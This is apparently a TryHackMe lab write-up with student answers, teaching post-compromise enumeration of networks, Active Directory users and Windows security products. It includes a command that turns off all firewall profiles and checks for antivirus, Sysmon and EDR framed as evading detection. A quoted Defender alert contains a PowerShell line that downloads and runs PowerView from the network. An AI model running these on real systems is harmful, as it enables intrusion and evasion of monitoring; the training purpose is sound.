---
Learn about and get hands-on with common technologies and security products used in corporate environments; both host and network-based security solutions are covered.
---

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/d8dcc12c59983f2ba6492eefe0454626.png)
### Introduction 



It is essential to be familiar with the environment where you have initial access to a compromised machine during a red team engagement. Therefore, performing reconnaissance and enumeration is a significant part, and the primary goal is to gather as much information as possible to be used in the next stage. 

With an initial foothold established, the post-exploitation process begins! 


This room introduces commonly-used concepts, technologies, and security products that we need to be aware of.

In this room, the assumption is that we have already gained access to the machine, and we are ready to expand our knowledge more about the environment by performing enumerating for the following:

    Network infrastrucutre
    Active Directory Environment
    Users and Groups
    Host-based security solutions
    Network-based security solutions
    Applications and services

### Deploy the VM 

In order to follow along with the task content and apply what is given in this room, you need to start the attached machine by using the green Start Machine button in this task, and wait a few minutes for it to boot up. To access the attached machine, you can either use the split in browser view or connect through the RDP.

	If you prefer to connect via RDP, make sure you deploy the AttackBox or connect to the VPN.
	Use the following credentials: kkidd:Pass123321@.

###  Network Infrastructure 

Once arriving onto an unknown network, our first goal is to identify where we are and what we can get to. During the red team engagement, we need to understand what target system we are dealing with, what service the machine provides, what kind of network we are in. Thus, the enumeration of the compromised machine after getting initial access is the key to answering these questions. This task will discuss the common types of networks we may face during the engagement.

Network segmentation is an extra layer of network security divided into multiple subnets. It is used to improve the security and management of the network. For example, it is used for preventing unauthorized access to corporate most valuable assets such as customer data, financial records, etc.

The Virtual Local Area Networks (VLANs) is a network technique used in network segmentation to control networking issues, such as broadcasting issues in the local network, and improve security. Hosts within the VLAN can only communicate with other hosts in the same VLAN network. 

If you want to learn more about network fundamentals, we suggest trying the following TryHackMe module: Network Fundamentals.
Internal Networks

Internal Networks are subnetworks that are segmented and separated based on the importance of the internal device or the importance of the accessibility of its data. The main purpose of the internal network(s) is to share information, faster and easier communications, collaboration tools, operational systems, and network services within an organization. In a corporate network, the network administrators intend to use network segmentation for various reasons, including controlling network traffic, optimizing network performance, and improving security posture. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f86b9cce1276f4c317bcb4bae7686891.png)

The previous diagram is an example of the simple concept of network segmentation as the network is divided into two networks. The first one is for employee workstations and personal devices. The second is for private and internal network devices that provide internal services such as DNS, internal web, email services, etc.

A Demilitarized Zone (DMZ)

A DMZ Network is an edge network that protects and adds an extra security layer to a corporation's internal local-area network from untrusted traffic. A common design for DMZ is a subnetwork that sits between the public internet and internal networks.

Designing a network within the company depends on its requirements and need. For example, suppose a company provides public services such as a website, DNS, FTP, Proxy, VPN, etc. In that case, they may design a DMZ network to isolate and enable access control on the public network traffic, untrusted traffic.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/df4d771470f80491ece99e42ee574ebf.png)

In the previous diagram, we represent the network traffic to the DMZ network in red color, which is untrusted ( comes directly from the internet). The green network traffic between the internal network is the controlled traffic that may go through one or more than one network security device(s).

Enumerating the system and the internal network is the discovering stage, which allows the attacker to learn about the system and the internal network. Based on the gained information, we use it to process lateral movement or privilege escalation to gain more privilege on the system or the AD environment.

Network Enumeration

There are various things to check related to networking aspects such as TCP and UDP ports and established connections, routing tables, ARP tables, etc.

Let's start checking the target machine's TCP and UDP open ports. This can be done using the netstat command as shown below.

```

Command Prompt

           
			
PS C:\Users\thm> netstat -na

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING

	    


```

The output reveals the open ports as well as the established connections. Next, let's list the ARP table, which contains the IP address and the physical address of the computers that communicated with the target machines within the network. This could be helpful to see the communications within the network to scan the other machines for open ports and vulnerabilities.

Address Resolution Protocol (ARP) is responsible for finding the MAC (hardware) address related to a specific IP address. It works by broadcasting an ARP query, "Who has this IP address? Tell me." And the response is of the form, "The IP address is at this MAC address." 

```

Command Prompt

           
			
PS C:\Users\thm> arp -a

Interface: 10.10.141.51 --- 0xa
  Internet Address      Physical Address      Type
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic
  10.10.255.255         ff-ff-ff-ff-ff-ff     static

	    


```

Internal Network Services

It provides private and internal network communication access for internal network devices. An example of network services is an internal DNS, web servers, custom applications, etc. It is important to note that the internal network services are not accessible outside the network. However, once we have initial access to one of the networks that access these network services, they will be reachable and available for communications. 

We will discuss more Windows applications and services in Task 9, including DNS and custom web applications.

### Active Directory (AD) environment 

What is the Active Directory (AD) environment?

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ff5bf25102d8dc46f58ffdb8b4ffe06c.png)

It is a Windows-based directory service that stores and provides data objects to the internal network environment. It allows for centralized management of authentication and authorization. The AD contains essential information about the network and the environment, including users, computers, printers, etc. For example, AD might have users' details such as job title, phone number, address, passwords, groups, permission, etc.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/59664b98a3a0b01cf6b7e83e039ddb84.png)

The diagram is one possible example of how Active Directory can be designed. The AD controller is placed in a subnet for servers (shown above as server network), and then the AD clients are on a separate network where they can join the domain and use the AD services via the firewall.

The following is a list of Active Directory components that we need to be familiar with:

    Domain Controllers
    Organizational Units
    AD objects
    AD Domains
    Forest
    AD Service Accounts: Built-in local users, Domain users, Managed service accounts
    Domain Administrators

A Domain Controller is a Windows server that provides Active Directory services and controls the entire domain. It is a form of centralized user management that provides encryption of user data as well as controlling access to a network, including users, groups, policies, and computers. It also enables resource access and sharing. These are all reasons why attackers target a domain controller in a domain because it contains a lot of high-value information.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c982e300552d540f0fc456cc05be21cd.png)

Organizational Units (OU's) are containers within the AD domain with a hierarchical structure.

Active Directory Objects can be a single user or a group, or a hardware component, such as a computer or printer. Each domain holds a database that contains object identity information that creates an AD environment, including:

    Users - A security principal that is allowed to authenticate to machines in the domain
    Computers - A special type of user accounts
    GPOs - Collections of policies that are applied to other AD objects

AD domains are a collection of Microsoft components within an AD network. 

AD Forest is a collection of domains that trust each other. 


![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/bb4bec81a78f745e8cbc38f7879002dd.png)

For more information about the basics of Active Directory, we suggest trying the following TryHackMe room: Active Directory Basics.



Once Initial Access has been achieved, finding an AD environment in a corporate network is significant as the Active Directory environment provides a lot of information to joined users about the environment. As a red teamer, we take advantage of this by enumerating the AD environment and gaining access to various details, which can then be used in the lateral movement stage.


In order to check whether the Windows machine is part of the AD environment or not, one way, we can use the command prompt systeminfo command. The output of the systeminfo provides information about the machine, including the operating system name and version, hostname, and other hardware information as well as the AD domain.

```
Powershell

           
			
PS C:\Users\thm> systeminfo | findstr Domain
OS Configuration:          Primary Domain Controller
Domain:                    thmdomain.com

	    
```

From the above output, we can see that the computer name is an AD with thmdomain.com as a domain name which confirms that it is a part of the AD environment. 

Note that if we get WORKGROUP in the domain section, then it means that this machine is part of a local workgroup.

Before going any further, ensure the attached machine is deployed and try what we discussed. Is the attached machine part of the AD environment? (Y|N)

*Y*

![[Pasted image 20220910180951.png]]

If it is part of an AD environment, what is the domain name of the AD?
*thmredteam.com*

### Users and Groups Management 

In this task, we will learn more about users and groups, especially within the Active Directory. Gathering information about the compromised machine is essential that could be used in the next stage. Account discovery is the first step once we have gained initial access to the compromised machine to understand what we have and what other accounts are in the system. 

![|222](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/31e10a217948bcdf9d68adada786efb7.png)
An Active Directory environment contains various accounts with the necessary permissions, access, and roles for different purposes. Common Active Directory service accounts include built-in local user accounts, domain user accounts, managed service accounts, and virtual accounts. 

    The built-in local users' accounts are used to manage the system locally, which is not part of the AD environment.
    Domain user accounts with access to an active directory environment can use the AD services (managed by AD).
    AD managed service accounts are limited domain user account with higher privileges to manage AD services.
    Domain Administrators are user accounts that can manage information in an Active Directory environment, including AD configurations, users, groups, permissions, roles, services, etc. One of the red team goals in engagement is to hunt for information that leads to a domain administrator having complete control over the AD environment.

The following are Active Directory Administrators accounts:


	BUILTIN\Administrator	Local admin access on a domain controller
Domain Admins	Administrative access to all resources in the domain
Enterprise Admins	Available only in the forest root
Schema Admins	Capable of modifying domain/forest; useful for red teamers
Server Operators	Can manage domain servers
Account Operators	Can manage users that are not in privileged groups

Now that we learn about various account types within the AD environment. Let's enumerate the Windows machine that we have access to during the initial access stage. As a current user, we have specific permissions to view or manage things within the machine and the AD environment. 

Active Directory (AD) Enum

Now, enumerating in the AD environment requires different tools and techniques. Once we confirm that the machine is part of the AD environment, we can start hunting for any variable info that may be used later. In this stage, we are using PowerShell to enumerate for users and groups.

The following PowerShell command is to get all active directory user accounts. Note that we need to use  -Filter argument.

```

PowerShell

           
			
PS C:\Users\thm> Get-ADUser  -Filter *
DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
UserPrincipalName :
PS C:\Users\thm>

	    


```

We can also use the LDAP hierarchical tree structure to find a user within the AD environment. The Distinguished Name (DN) is a collection of comma-separated key and value pairs used to identify unique records within the directory. The DN consists of Domain Component (DC), OrganizationalUnitName (OU), Common Name (CN), and others. The following "CN=User1,CN=Users,DC=thmredteam,DC=com" is an example of DN, which can be visualized as follow:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/764c72d40ec3d823b05d6473702e00f5.png)

Using the SearchBase option, we specify a specific Common-Name CN in the active directory. For example, we can specify to list any user(s) that part of Users.

```

PowerShell

           
			
PS C:\Users\thm> Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"


DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
UserPrincipalName :

	    


```

Note that the result may contain more than one user depending on the configuration of the CN. Try the command to find all users within the THM OU and answer question 1 below.


Use the Get-ADUser -Filter * -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available?
(Swap OU=THM and CN=Users in the searchBase string "CN=Users,DC=THMREDTEAM,DC=COM".)

```
PS C:\Users\kkidd> Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"


DistinguishedName : CN=Pierre Pittman,OU=THM,DC=thmredteam,DC=com
GivenName         : Pierre
Name              : Pierre Pittman
ObjectClass       : user
ObjectGUID        : 34febcdd-49dc-4160-b88e-7e6323f40dba
SamAccountName    : ppittman
SID               : S-1-5-21-1966530601-3185510712-10604624-1113
Surname           : Pittman
UserPrincipalName : ppittman@thmredteam.com

DistinguishedName : CN=Dario Philips,OU=THM,DC=thmredteam,DC=com
GivenName         : Dario
Name              : Dario Philips
ObjectClass       : user
ObjectGUID        : 3cc9cfc7-3c62-4d46-8a83-b8c02f45efbb
SamAccountName    : dphilips
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
Surname           : Philips
UserPrincipalName : dphilips@thmredteam.com

DistinguishedName : CN=Weronika Burgess,OU=THM,DC=thmredteam,DC=com
GivenName         : Weronika
Name              : Weronika Burgess
ObjectClass       : user
ObjectGUID        : 88e2935a-2b50-4510-816d-8eab5b06f548
SamAccountName    : wburgess
SID               : S-1-5-21-1966530601-3185510712-10604624-1116
Surname           : Burgess
UserPrincipalName : wburgess@thmredteam.com

DistinguishedName : CN=Cecil Solomon,OU=THM,DC=thmredteam,DC=com
GivenName         : Cecil
Name              : Cecil Solomon
ObjectClass       : user
ObjectGUID        : 88ca7ae9-0f03-4956-8916-b0cbd985520c
SamAccountName    : csolomon
SID               : S-1-5-21-1966530601-3185510712-10604624-1120
Surname           : Solomon
UserPrincipalName : csolomon@thmredteam.com

DistinguishedName : CN=Kevin Kidd,OU=THM,DC=thmredteam,DC=com
Enabled           : True
GivenName         : Kevin
Name              : Kevin Kidd
ObjectClass       : user
ObjectGUID        : 42353060-b13d-48b4-af2f-70543e6ca8f8
SamAccountName    : kkidd
SID               : S-1-5-21-1966530601-3185510712-10604624-1122
Surname           : Kidd
UserPrincipalName : kkidd@thmredteam.com

DistinguishedName : CN=THM Admin,OU=THM,DC=thmredteam,DC=com
Enabled           : True
GivenName         : THM
Name              : THM Admin
ObjectClass       : user
ObjectGUID        : 8974cd3d-9bf0-4c43-ac7d-068413fb462c
SamAccountName    : thmadmin
SID               : S-1-5-21-1966530601-3185510712-10604624-1124
Surname           : Admin
UserPrincipalName : thmadmin@thmredteam.com
```
*6*

Once you run the previous command, what is the UserPrincipalName (email) of the admin account?

*thmadmin@thmredteam.com*


### Host Security Solution #1 

Before performing further actions, we need to obtain general knowledge about the security solutions in place. Remember, it is important to enumerate antivirus and security detection methods on an endpoint in order to stay as undetected as possible and reduce the chance of getting caught.

This task will discuss the common security solution used in corporate networks, divided into Host and Network security solutions.

Host Security Solutions

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1df437e97cc50712a26d019469f4dfda.png)

It is a set of software applications used to monitor and detect abnormal and malicious activities within the host, including:

    Antivirus software
    Microsoft Windows Defender
    Host-based Firewall
    Security Event Logging and Monitoring 
    Host-based Intrusion Detection System (HIDS)/ Host-based Intrusion Prevention System (HIPS)
    Endpoint Detection and Response (EDR)

Let's go more detail through the host-based security solutions that we may encounter during the red team engagement.

Antivirus Software (AV)

Antivirus software also known as anti-malware, is mainly used to monitor, detect, and prevent malicious software from being executed within the host.  Most antivirus software applications use well-known features, including Background scanning, Full system scans, Virus definitions. In the background scanning, the antivirus software works in real-time and scans all open and used files in the background. The full system scan is essential when you first install the antivirus. The most interesting part is the virus definitions, where antivirus software replies to the pre-defined virus. That's why antivirus software needs to update from time to time.

There are various detection techniques that the antivirus uses, including

    Signature-based detection
    Heuristic-based detection
    Behavior-based detection

Signature-based detection is one of the common and traditional techniques used in antivirus software to identify malicious files. Often, researchers or users submit their infected files into an antivirus engine platform for further analysis by AV vendors, and if it confirms as malicious, then the signature gets registered in their database. The antivirus software compares the scanned file with a database of known signatures for possible attacks and malware on the client-side. If we have a match, then it considers a threat.

Heuristic-based detection uses machine learning to decide whether we have the malicious file or not. It scans and statically analyses in real-time in order to find suspicious properties in the application's code or check whether it uses uncommon Windows or system APIs. It does not rely on the signature-based attack in making the decisions, or sometimes it does. This depends on the implementation of the antivirus software.

Finally, Behavior-based detection relies on monitoring and examining the execution of applications to find abnormal behaviors and uncommon activities, such as creating/updating values in registry keys, killing/creating processes, etc.

As a red teamer, it is essential to be aware of whether antivirus exists or not. It prevents us from doing what we are attempting to do. We can enumerate AV software using Windows built-in tools, such as wmic.

```
PowerShell

           
			
PS C:\Users\thm> wmic /namespace:\\root\securitycenter2 path antivirusproduct

	    
```

This also can be done using PowerShell, which gives the same result.

```
PowerShell

           
			
PS C:\Users\thm> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct


displayName              : Bitdefender Antivirus
instanceGuid             : {BAF124F4-FA00-8560-3FDE-6C380446AEFB}
pathToSignedProductExe   : C:\Program Files\Bitdefender\Bitdefender Security\wscfix.exe
pathToSignedReportingExe : C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe
productState             : 266240
timestamp                : Wed, 15 Dec 2021 12:40:10 GMT
PSComputerName           :

displayName              : Windows Defender
instanceGuid             : {D58FFC3A-813B-4fae-9E44-DA132C9FAA36}
pathToSignedProductExe   : windowsdefender://
pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
productState             : 393472
timestamp                : Fri, 15 Oct 2021 22:32:01 GMT
PSComputerName           :

	    
```

As a result, there is a third-party antivirus (Bitdefender Antivirus) and Windows Defender installed on the computer. Note that Windows servers may not have SecurityCenter2 namespace, which may not work on the attached VM. Instead, it works for Windows workstations!

Microsoft Windows Defender

Microsoft Windows Defender is a pre-installed antivirus security tool that runs on endpoints. It uses various algorithms in the detection, including machine learning, big-data analysis, in-depth threat resistance research, and Microsoft cloud infrastructure in protection against malware and viruses. MS Defender works in three protection modes: Active, Passive, Disable modes. 

Active mode is used where the MS Defender runs as the primary antivirus software on the machine where provides protection and remediation. Passive mode is run when a 3rd party antivirus software is installed. Therefore, it works as secondary antivirus software where it scans files and detects threats but does not provide remediation. Finally, Disable mode is when the MS Defender is disabled or uninstalled from the system.

 We can use the following PowerShell command to check the service state of Windows Defender:

```
PowerShell

           
			
PS C:\Users\thm> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Antivirus Service

	    
```

Next, we can start using the Get-MpComputerStatus cmdlet to get the current Windows Defender status. However, it provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc. We can use select to specify what we need for as follows,

```
PowerShell

           
			
PS C:\Users\thm> Get-MpComputerStatus | select RealTimeProtectionEnabled

RealTimeProtectionEnabled
-------------------------
                    False

	    
```

As a result, MpComputerStatus highlights whether Windows Defender is enabled or not.

3. Host-based Firewall: It is a security tool installed and run on a host machine that can prevent and block attacker or red teamers' attack attempts. Thus, it is essential to enumerate and gather details about the firewall and its rules within the machine we have initial access to.  

![|222](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/130cf78f364228f7b7f0408d98f0bf61.png)

The main purpose of the host-based firewall is to control the inbound and outbound traffic that goes through the device's interface. It protects the host from untrusted devices that are on the same network. A modern host-based firewall uses multiple levels of analyzing traffic, including packet analysis, while establishing the connection.

A firewall acts as control access at the network layer. It is capable of allowing and denying network packets. For example, a firewall can be configured to block ICMP packets sent through the ping command from other machines in the same network. Next-generation firewalls also can inspect other OSI layers, such as application layers. Therefore, it can detect and block SQL injection and other application-layer attacks.

```
PowerShell

           
			
PS C:\Users\thm> Get-NetFirewallProfile | Format-Table Name, Enabled

Name    Enabled
----    -------
Domain     True
Private    True
Public     True

	    
```

If we have admin privileges on the current user we logged in with, then we try to disable one or more than one firewall profile using the Set-NetFirewallProfile cmdlet.

```
PowerShell

           
			
PS C:\Windows\system32> Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
PS C:\Windows\system32> Get-NetFirewallProfile | Format-Table Name, Enabled
---- -------
Domain False
Private False
Public False

	    
```

We can also learn and check the current Firewall rules, whether allowing or denying by the firewall.

```
PowerShell

           
			
PS C:\Users\thm> Get-NetFirewallRule | select DisplayName, Enabled, Description

DisplayName                                                                  Enabled
-----------                                                                  -------
Virtual Machine Monitoring (DCOM-In)                                           False
Virtual Machine Monitoring (Echo Request - ICMPv4-In)                          False
Virtual Machine Monitoring (Echo Request - ICMPv6-In)                          False
Virtual Machine Monitoring (NB-Session-In)                                     False
Virtual Machine Monitoring (RPC)                                               False
SNMP Trap Service (UDP In)                                                     False
SNMP Trap Service (UDP In)                                                     False
Connected User Experiences and Telemetry                                        True
Delivery Optimization (TCP-In)                                                  True

	    
```

During the red team engagement, we have no clue what the firewall blocks. However, we can take advantage of some PowerShell cmdlets such as Test-NetConnection and TcpClient. Assume we know that a firewall is in place, and we need to test inbound connection without extra tools, then we can do the following: 

```
PowerShell

           
			
PS C:\Users\thm> Test-NetConnection -ComputerName 127.0.0.1 -Port 80


ComputerName     : 127.0.0.1
RemoteAddress    : 127.0.0.1
RemotePort       : 80
InterfaceAlias   : Loopback Pseudo-Interface 1
SourceAddress    : 127.0.0.1
TcpTestSucceeded : True

PS C:\Users\thm> (New-Object System.Net.Sockets.TcpClient("127.0.0.1", "80")).Connected
True

	    
```

As a result, we can confirm the inbound connection on port 80 is open and allowed in the firewall. Note that we can also test for remote targets in the same network or domain names by specifying in the -ComputerName argument for the Test-NetConnection. 


![[Pasted image 20220910183447.png]]

Enumerate the attached Windows machine and check whether the host-based firewall is enabled or not! (Y|N)
*N*

```
PS C:\Users\kkidd> Get-MpThreat


CategoryID       : 8
DidThreatExecute : False
IsActive         : False
Resources        : {CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).D
                   ownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1');
                   Get-NetGroupMember 'Domain Admins', internalCmdLine:_i AQAAAA2wA4AAAAAAAAAAAF8Q02fXQQEAbRa5PR40vlvAd
                   Uq6bbN3ro51dwpUcm9qYW46UG93ZXJTaGVsbC9Qb3dlcnNwbG9pdC5HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                   AAAAA== 57 10 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell IEX (New-Object N
                   et.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Power
                   View.ps1'); Get-NetGroupMember 'Domain Admins'}
RollupStatus     : 1
SchemaVersion    : 1.0.0.0
SeverityID       : 5
ThreatID         : 2147725325
ThreatName       : Trojan:PowerShell/Powersploit.G
TypeID           : 0
PSComputerName   :

CategoryID       : 34
DidThreatExecute : False
IsActive         : False
Resources        : {file:_C:\Users\kkidd\Desktop\PowerView.ps1, containerfile:_C:\Users\kkidd\Desktop\PowerView.ps1,
                   file:_C:\Users\kkidd\Desktop\PowerView.ps1->(UTF-8)}
RollupStatus     : 1
SchemaVersion    : 1.0.0.0
SeverityID       : 4
ThreatID         : 2147755688
ThreatName       : HackTool:PowerShell/PowerView
TypeID           : 0
PSComputerName   :

CategoryID       : 34
DidThreatExecute : True
IsActive         : False
Resources        : {amsi:_C:\Tools\PowerView.ps1, internalamsi:_0296D712FA44FD733F95B0C00E4631FC}
RollupStatus     : 65
SchemaVersion    : 1.0.0.0
SeverityID       : 4
ThreatID         : 2147762887
ThreatName       : HackTool:PowerShell/InvKerber.B
TypeID           : 0
PSComputerName   :
```

Using PowerShell cmdlets such Get-MpThreat can provide us with threats details that have been detected using MS Defender. Run it and answer the following: What is the file name that causes this alert to record?
(Check Resources section)
*powerview.ps1*

```
PS C:\Users\kkidd> Get-NetFirewallRule | select DisplayName, Enabled, Description | findstr "THM-Connection"
THM-Connection                                                                  True THM-Connection inbound to 17337...
```

Enumerate the firewall rules of the attached Windows machine. What is the port that is allowed under the THM-Connection rule?
(Get-NetFirewallRule | findstr "Rule-Name")
*17337*

In the next task, we will keep discussing the host security solution. I'm ready!
*No answer needed*

### Host Security Solution #2 

In this task, we will keep discussing host security solutions.

Security Event Logging and Monitoring 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f9dd0b21bd47bdb0ef84389a5ace857b.png)

By default, Operating systems log various activity events in the system using log files. The event logging feature is available to the IT system and network administrators to monitor and analyze important events, whether on the host or the network side. In cooperating networks, security teams utilize the logging event technique to track and investigate security incidents. 

There are various categories where the Windows operating system logs event information, including the application, system, security, services, etc. In addition, security and network devices store event information into log files to allow the system administrators to get an insight into what is going on.

We can get a list of available event logs on the local machine using the Get-EventLog cmdlet.

```
PowerShell

           
			
PS C:\Users\thm> Get-EventLog -List

  Max(K) Retain OverflowAction        Entries Log
  ------ ------ --------------        ------- ---
     512      7 OverwriteOlder             59 Active Directory Web Services
  20,480      0 OverwriteAsNeeded         512 Application
     512      0 OverwriteAsNeeded         170 Directory Service
 102,400      0 OverwriteAsNeeded          67 DNS Server
  20,480      0 OverwriteAsNeeded       4,345 System
  15,360      0 OverwriteAsNeeded       1,692 Windows PowerShell

	    
```

Sometimes, the list of available event logs gives you an insight into what applications and services are installed on the machine! For example, we can see that the local machine has Active Directory, DNS server, etc. For more information about the Get-EventLog cmdlet with examples, visit the Microsoft documents website.

In corporate networks, log agent software is installed on clients to collect and gather logs from different sensors to analyze and monitor activities within the network. We will discuss them more in the Network Security Solution task.

System Monitor (Sysmon)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c77acd6d831c3b9f4c5b5f0cdc0d08c.png)

Windows System Monitor sysmon is a service and device driver. It is one of the Microsoft Sysinternals suites. The sysmon tool is not an essential tool (not installed by default), but it starts gathering and logging events once installed. These logs indicators can significantly help system administrators and blue teamers to track and investigate malicious activity and help with general troubleshooting.

One of the great features of the sysmon  tool is that it can log many important events, and you can also create your own rule(s) and configuration to monitor:

    Process creation and termination
    Network connections
    Modification on file
    Remote threats
    Process and memory access
    and many others

For learning more about sysmon, visit the Windows document page here.

As a red teamer, one of the primary goals is to stay undetectable, so it is essential to be aware of these tools and avoid causing generating and alerting events. The following are some of the tricks that can be used to detect whether the sysmon is available in the victim machine or not. 

We can look for a process or service that has been named "Sysmon" within the current process or services as follows,

```
PowerShell

           
			
PS C:\Users\thm> Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    373      15    20212      31716              3316   0 Sysmon

	    
```

or look for services as follows,

```
PowerShell

           
			
PS C:\Users\thm> Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
# or
Get-Service | where-object {$_.DisplayName -like "*sysm*"}

	    
```

It also can be done by checking the Windows registry 

```
PowerShell

           
			
PS C:\Users\thm> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational

	    
```


All these commands confirm if the sysmon tool is installed. Once we detect it, we can try to find the sysmon configuration file if we have readable permission to understand what system administrators are monitoring.

```
PowerShell

           
			
PS C:\Users\thm> findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
C:\tools\Sysmon\sysmonconfig.xml:      
C:\tools\Sysmon\sysmonconfig.xml:      

	    
```

For more detail about the Windows sysmon tool and how to utilize it within endpoints, we suggest trying the TryHackMe room: Sysmon.

Host-based Intrusion Detection/Prevention System (HIDS/HIPS)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7d94eafeb8af31d872399394265f2284.png)

HIDS stands for Host-based Intrusion Detection System. It is software that has the ability to monitor and detect abnormal and malicious activities in a host. The primary purpose of HIDS is to detect suspicious activities and not to prevent them. There are two methods that the host-based or network intrusion detection system works, including:

    Signature-based IDS - it looks at checksums and message authentication.
    Anomaly-based IDS looks for unexpected activities, including abnormal bandwidth usage, protocols, and ports.

Host-based Intrusion Prevention Systems (HIPS) works by securing the operating system activities which where is installed. It is a detecting and prevention solution against well-known attacks and abnormal behaviors. HIPS is capable of auditing log files of the host, monitoring processes, and protecting system resources. HIPS is a mixture of best product features such as antivirus, behavior analysis, network, application firewall, etc.


There is also a network-based IDS/IPS, which we will be covering in the next task. 


Endpoint Detection and Response (EDR)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92a60622a80d64cc6dbedaa6c207662b.png)

It is also known as Endpoint Detection and Threat Response (EDTR). The EDR is a cybersecurity solution that defends against malware and other threats. EDRs can look for malicious files, monitor endpoint, system, and network events, and record them in a database for further analysis, detection, and investigation. EDRs are the next generation of antivirus and detect malicious activities on the host in real-time.

EDR analyze system data and behavior for making section threats, including

    Malware, including viruses, trojans, adware, keyloggers
    Exploit chains
    Ransomware

Below are some common EDR software for endpoints

    Cylance
    Crowdstrike
    Symantec
    SentinelOne
    Many others

Even though an attacker successfully delivered their payload and bypassed EDR in receiving reverse shell, EDR is still running and monitors the system. It may block us from doing something else if it flags an alert.

We can use scripts for enumerating security products within the machine, such as [Invoke-EDRChecker](https://github.com/PwnDexter/Invoke-EDRChecker) and [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker). They check for commonly used Antivirus, EDR, logging monitor products by checking file metadata, processes, DLL loaded into current processes, Services, and drivers, directories.


We covered some of the common security endpoints we may encounter during the red team engagement. Let's discuss the network-based security solutions in the next task!
*No answer needed*

### Network Security Solutions 

This task will discuss network security solutions commonly seen and used in enterprises networks.

Network Security Solutions

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6ea5b43e0a5bda4164ffdad85562b328.png)

Network security solutions could be software or hardware appliances used to monitor, detect and prevent malicious activities within the network. It focuses on protecting clients and devices connected to the cooperation network. The network security solution includes but is not limited to:

    Network Firewall
    SIEM
    IDS/IPS

Network Firewall

![|222](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/bf44e20b322f58af384d1fdd1d36503b.png)

A firewall is the first checkpoint for untrusted traffic that arrives at a network. The firewall filters the untrusted traffic before passing it into the network based on rules and policies. In addition, Firewalls can be used to separate networks from external traffic sources, internal traffic sources, or even specific applications. Nowadays, firewall products are built-in network routers or other security products that provide various security features. The following are some firewall types that enterprises may use.

    Packet-filtering firewalls
    Proxy firewalls
    NAT firewalls
    Web application firewalls

Security Information and Event Management (SIEM)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/79e7e34aae2b2f5234edf677e00bc3a1.png)

SIEM combines Security Information Management (SIM) and Security Event Management (SEM) to monitor and analyze events and track and log data in real-time. SIEM helps system administrators and blue teamers to monitor and track potential security threats and vulnerabilities before causing damage to an organization. 

